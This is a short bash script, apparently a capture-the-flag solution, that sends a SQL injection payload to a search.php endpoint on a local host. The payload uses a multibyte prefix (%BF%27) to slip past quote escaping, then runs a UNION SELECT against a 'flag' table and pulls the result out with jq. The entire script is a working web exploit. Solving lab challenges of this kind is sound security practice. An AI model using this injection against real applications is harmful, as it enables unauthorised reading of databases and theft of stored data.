#!/bin/bash

HOST="${HOST:-http://localhost:8080}"

curl -s "$HOST/search.php?q=%BF%27%20union%20select%20flag,1,1,1,1,1%20from%20flag%3B%20--%20" | jq -r '.[0].id'
